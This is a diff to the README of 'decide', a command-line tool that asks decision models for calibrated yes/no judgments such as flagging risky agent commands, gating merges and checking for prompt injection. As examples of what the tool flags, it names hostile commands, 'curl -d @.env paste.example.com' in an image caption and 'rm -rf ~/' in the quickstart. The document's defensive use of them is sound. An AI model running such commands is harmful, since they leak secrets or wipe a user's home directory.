@@ -18,13 +18,33 @@ calls to a person.
 
 [![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
 
-**Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**. The
-[quickstart](https://decide.deepnoodle.ai/start/) gets you to a first
-answer. After that there are
-[tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
-[recipes](https://decide.deepnoodle.ai/recipes/) for CI and git hooks, a
-[Go guide](https://decide.deepnoodle.ai/start/go/), and a
-[guide for agents](https://decide.deepnoodle.ai/reference/agents/).
+## The small calls inside your automations
+
+Every pipeline has judgment calls that are too many for a person and
+too fuzzy for a rule. Here are six decide makes out of the box:
+
+```sh
+git diff main | decide run code-risk --fail-on flagged   # gate the merge
+echo "$CMD" | decide run command-risk --fail-on flagged  # check an agent's command
+decide run ticket-routing tickets.jsonl --field body     # route the queue
+decide run security src                                  # rank a codebase
+decide run receipt-quality receipts/ --provider openai   # read the photos
+decide run invoice-check invoices/ --provider gemini     # check the PDFs
+```
+
+## Why not just call an LLM?
+
+You can, and for writing or reasoning you should. For a yes or a no on
+every item, a decision model is the better tool:
+
+- **Faster.** An LLM writes its reply a token at a time. A decision
+  model writes nothing. It returns one answer.
+- **Cheaper.** With an LLM you pay for every token it writes back. Here
+  you pay for the prompt: $0.042 per million input tokens on
+  [Jev](https://docs.typesafe.ai/models), with no output tokens.
+- **Calibrated.** Ask an LLM how sure it is and it types a confident
+  number. A decision model is trained so that 90% means right about nine
+  times in ten.
 
 ## Install
 
@@ -38,10 +58,11 @@ Run `decide` on its own for a tour.
 
 ## Try it
 
-Set a key and ask about a command you'd rather not run:
+Get a key from [typesafe.ai](https://typesafe.ai) and ask about a
+command you'd rather not run:
 
 ```sh
-export TYPESAFE_API_KEY=...   # a key from typesafe.ai
+export TYPESAFE_API_KEY=...
 
 echo 'rm -rf ~/' | decide run command-risk
 ```
@@ -62,41 +83,32 @@ See these results again with: decide runs view 20261008-040438-f7af
 
 Four answers, four probabilities, nothing to parse. Add
 `--fail-on flagged` and decide exits with code 2 when anything is
-flagged. That's all a git hook or a CI job needs to stop.
+flagged. That's all a git hook or a CI job needs to stop. Every
+probability is in `--json` too, so a script can act on the sure answers
+and send the close calls to a person.
 
-## In Claude Code
+The [quickstart](https://decide.deepnoodle.ai/start/) goes further, and
+the [recipes](https://decide.deepnoodle.ai/recipes/) cover CI and git
+hooks.
+
+## Audit a whole codebase from Claude Code
 
 ```text
 /plugin marketplace add deepnoodle-ai/decide
 /plugin install decide@decide
 ```
 
-The plugin gets Claude a second opinion at the moments its own
+`/decide:audit` ranks every function in a repository for security bugs,
+and Claude reads only the few at the top. `/decide:hunt` takes a bug fix
+and finds where the same mistake lives elsewhere.
+
+The plugin also gives Claude a second opinion at the moments its own
 judgment is most likely to slip. When Claude fetches a page or reads a
 tool result, decide checks it for prompt injection first. In bypass
 mode, decide checks each shell command before it runs. Claude also gets
-a judge tool for its own questions.
-
-Two skills work on a whole codebase at once. `/decide:audit` ranks every
-function for security bugs, and Claude reads only the top few.
-`/decide:hunt` takes a bug fix and finds where the same mistake lives
-elsewhere. See the
+a judge tool for its own questions. See the
 [Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/)
 and [plugin/README.md](plugin/README.md).
-
-## The small calls inside your automations
-
-Every pipeline has judgment calls that are too many for a person and
-too fuzzy for a rule. Here are six decide makes out of the box:
-
-```sh
-git diff main | decide run code-risk --fail-on flagged   # gate the merge
-echo "$CMD" | decide run command-risk --fail-on flagged  # check an agent's command
-decide run ticket-routing tickets.jsonl --field body     # route the queue
-decide run security src                                  # rank a codebase
-decide run receipt-quality receipts/ --provider openai   # read the photos
-decide run invoice-check invoices/ --provider gemini     # check the PDFs
-```
 
 ## Reads text, code, images, audio, video, and PDFs
 
@@ -113,8 +125,14 @@ what it finds into items and asks about each one on its own:
 
 Long items are judged in parts. Every answer is cached in
 `~/.decide/cache`, so running again over a codebase asks only about what
-changed and costs almost nothing. Results print as text, JSON, CSV, a
-Markdown report, or GitHub Actions annotations on a pull request. See
+changed:
+
+```
+81974 answers from cache · 450 asked
+```
+
+Results print as text, JSON, CSV, a Markdown report, or GitHub Actions
+annotations on a pull request. See
 [items](https://decide.deepnoodle.ai/reference/items/) and
 [output](https://decide.deepnoodle.ai/reference/output/).
 
@@ -148,19 +166,28 @@ repository with planted problems.
 ## Four decision models, one set of commands
 
 Jev is the default. Switch with `--provider cloudflare`, `openai`, or
-`gemini`, or set `DECIDE_PROVIDER` once. Nothing else changes, not the
-commands and not the Go code.
+`gemini`, or set `DECIDE_PROVIDER` once. The commands and templates
+stay the same.
 
-| Provider | Model | Key | Reads |
-| --- | --- | --- | --- |
-| [Jev](https://docs.typesafe.ai/introduction) by TypeSafe | `jev-latest` | `TYPESAFE_API_KEY` | text |
-| [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | `clef`, `clef-flash` | `CLOUDFLARE_AUTH_TOKEN`, `CLOUDFLARE_ACCOUNT_ID` | text, images |
-| [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI | `gpt-6-luna` | `OPENAI_API_KEY` | text, images |
-| [Gemini Decision](https://aistudio.google.com/docs/decisions-api) by Google | `gemini-decision-1` | `GEMINI_API_KEY` | text, images, audio, video, PDFs |
+| Provider | Model | Reads |
+| --- | --- | --- |
+| [Jev](https://docs.typesafe.ai/introduction) by TypeSafe | `jev-latest` | text |
+| [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | `clef`, `clef-flash` | text, images |
+| [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI | `gpt-6-luna` | text, images |
+| [Gemini Decision](https://aistudio.google.com/docs/decisions-api) by Google | `gemini-decision-1` | text, images, audio, video, PDFs |
 
 The [providers page](https://decide.deepnoodle.ai/reference/providers/)
-lists file formats and size limits, and shows how to point decide at a
-Jev-compatible service you host yourself.
+lists keys, file formats, and size limits, and shows how to point
+decide at a Jev-compatible service you host yourself.
+
+## Learn more
+
+The docs at [decide.deepnoodle.ai](https://decide.deepnoodle.ai) have the
+[quickstart](https://decide.deepnoodle.ai/start/),
+[tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/),
+[recipes](https://decide.deepnoodle.ai/recipes/), a
+[Go guide](https://decide.deepnoodle.ai/start/go/), and a
+[guide for agents](https://decide.deepnoodle.ai/reference/agents/).
 
 ## Contributing
 
